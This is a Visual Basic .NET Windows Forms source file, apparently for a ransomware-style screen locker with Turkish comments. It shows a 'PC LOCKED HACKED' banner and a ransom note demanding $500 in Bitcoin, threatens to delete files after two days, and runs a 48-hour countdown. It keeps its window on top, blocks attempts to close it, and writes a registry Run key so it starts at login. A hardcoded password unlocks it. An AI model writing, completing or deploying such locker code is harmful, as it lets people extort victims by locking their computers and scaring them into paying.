﻿Imports System.Media
Imports Microsoft.Win32

Public Class Form2
    Dim pass As String = "123456"
    Dim i As Integer
    Dim strmsg As String
    'PROGRAM ŞİFRESİ
    Dim Mayclose As Boolean = True
    Dim LL, II, PP As Integer
    Dim TXT As String
    'KİLİT KODU
    Dim SESKISA As New SoundPlayer(My.Resources.SESKISA)
    Dim BTN2 As New SoundPlayer(My.Resources.BTN2)

    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        SESKISA.Play()
        TXT = "PC LOCKED HACKED"
        LL = Len(TXT)
        II = 1
        PP = 1
        Form3.Show()
        Label2.Parent = PictureBox1
        strmsg = "YOU MUST NOT PAY $ 500 in Bitcoin for the PASSWORD:" + Environment.NewLine + "AND THE PASSWORD WILL BE SENT TO YOUR MAIL ADDRESS ASAP." + Environment.NewLine + "ALL DOCUMENTS AND FILES WILL BE DELETED IF THE PAYMENT IS NOT MADE WITHIN 2 DAYS." + Environment.NewLine + Environment.NewLine + "DO NOT RESTART YOUR PC, IF YOU DO THIS, YOUR DATA WILL BE DELETED." + Environment.NewLine + "CONTACT FOR PASSWORD :yangshack@gmail.com"
        Timer4.Enabled = True
    End Sub

    Public Shared Sub AddStartup(ByVal Name As String, ByVal Path As String)

        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)

    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.TopMost = True
    End Sub
    Private Sub Form2_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing

        If Mayclose = True Then
            e.Cancel = True
        ElseIf Mayclose = False Then
            e.Cancel = False
        End If
    End Sub

    Private Sub AddCurrentKey(ByVal name As String, ByVal path As String)
        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        key.SetValue(name, path)
    End Sub
    'BAŞLATA EKLEMEK İÇİN KAYIT DEFTERİNDEN SİLME KODU
    Private Sub RemoveCurrentKey(ByVal name As String)
        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        key.DeleteValue(name, False)
    End Sub

    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked Then
            AddCurrentKey("Enter Name of Application", System.Reflection.Assembly.GetEntryAssembly.Location)
        Else
            RemoveCurrentKey("Enter Name of Application")
        End If
        If CheckBox2.Checked Then
            TextBox1.UseSystemPasswordChar = False
        Else
            TextBox1.UseSystemPasswordChar = True
        End If

    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Label1.Text = Label1.Text + Mid(TXT, II, 1)
        Label1.Text = TXT
        Randomize()
        Label1.ForeColor = Color.FromArgb(255, Rnd() * 255, Rnd() * 255, Rnd() * 255)

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        'BUTONA TIKLANINCA TEXTBOXA GİRİLEN KODU
        If TextBox1.Text = pass Then
            Mayclose = False
            Me.Close()
        Else
            Label2.Visible = True

            'MSJ KODU

            Dim result As DialogResult = MessageBox.Show("WRONG PASSWORD !!!!", _
                              "PLEASE TRY AGAIN")
        End If
    End Sub



    Private Sub Form2_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyDown
        If e.KeyCode = Keys.Enter Then
            GrayButton2.PerformClick()
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As System.Object, e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked

        My.Computer.Clipboard.SetText(TextBox2.Text)
        MessageBox.Show("COPYED !!!!", _
                            "OK")

    End Sub


    Private Sub Timer3_Tick(sender As System.Object, e As System.EventArgs) Handles Timer3.Tick
        Dim zsaat, zdakika, zsaniye, toplamsaniye As Integer
        zsaat = Val(TextBox5.Text)
        zdakika = Val(TextBox4.Text)
        zsaniye = Val(TextBox3.Text)
        toplamsaniye = (zsaat * 3600) + (zdakika * 60) + zsaniye
        If toplamsaniye > 1 Then
            Dim ysaat, ydakika, ysaniye As Integer
            Dim y1, y2, y3 As String
            toplamsaniye = toplamsaniye - 1
            ysaat = Int(toplamsaniye / 3600)
            ydakika = Int((toplamsaniye - (ysaat * 3600)) / 60)
            ysaniye = Int(toplamsaniye - ((ysaat * 3600) + (ydakika * 60)))
            TextBox5.Text = ysaat
            TextBox4.Text = ydakika
            TextBox3.Text = ysaniye
            If ysaat < 10 Then
                y1 = "0" & ysaat
            Else
                y1 = ysaat
            End If
            If ydakika < 10 Then
                y2 = "0" & ydakika
            Else
                y2 = ydakika
            End If
            If ysaniye < 10 Then
                y3 = "0" & ysaniye
            Else
                y3 = ysaniye
            End If
            Label4.Text = y1 & ":" & y2 & ":" & y3
        Else
            Timer3.Enabled = False
            Label4.Text = "00:00:00"
            Me.BackColor = Color.Red
            doldur()
        End If
    End Sub
    Public Sub doldur()
        saat.Items.Clear()
        dakika.Items.Clear()
        saniye.Items.Clear()
        For Me.i = 0 To 10
            saat.Items.Add(i)
        Next
        For Me.i = 0 To 59
            dakika.Items.Add(i)
        Next
        For Me.i = 0 To 59
            saniye.Items.Add(i)
        Next
        saat.Text = 48
        dakika.Text = 0
        saniye.Text = 0
        Dim z1, z2, z3 As Integer
        Dim w1, w2, w3 As String
        z1 = Val(saat.Text.ToString)
        z2 = Val(dakika.Text.ToString)
        z3 = Val(saniye.Text.ToString)
        If z1 < 10 Then
            w1 = "0" & z1
        Else
            w1 = z1
        End If
        If z2 < 10 Then
            w2 = "0" & z2
        Else
            w2 = z2
        End If
        If z3 < 10 Then
            w3 = "0" & z3
        Else
            w3 = z3
        End If
        TextBox5.Text = z1
        TextBox4.Text = z2
        TextBox3.Text = z3

        Label4.Text = w1 & ":" & w2 & ":" & w3
        Me.BackColor = Color.White
        Timer3.Enabled = True
        saat.Enabled = False
        dakika.Enabled = False
        saniye.Enabled = False
    End Sub
    Private Sub frmAna_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.BackColor = Color.White
        doldur()
    End Sub

    Private Sub GrayButton1_Click(sender As System.Object, e As System.EventArgs) Handles GrayButton1.Click

        BTN2.Play()
        'BUTONA TIKLANINCA TEXTBOXA GİRİLEN KODU
        If TextBox1.Text = pass Then
            Mayclose = False
            Me.Close()
        Else
            Label2.Visible = True

            'MSJ KODU

            Dim result As DialogResult = MessageBox.Show("WRONG PASSWORD !!!!", _
                              "PLEASE TRY AGAIN")
        End If
    End Sub

    Private Sub GrayButton2_Click(sender As System.Object, e As System.EventArgs) Handles GrayButton2.Click
        BTN2.Play()
        Form3.Show()

    End Sub

    Private Sub Timer4_Tick(sender As System.Object, e As System.EventArgs) Handles Timer4.Tick
        i += 1
        Label2.Text += strmsg.Substring(i - 1, 1)
        If i = strmsg.Length Then
            Timer4.Enabled = False
        End If
    End Sub
End Class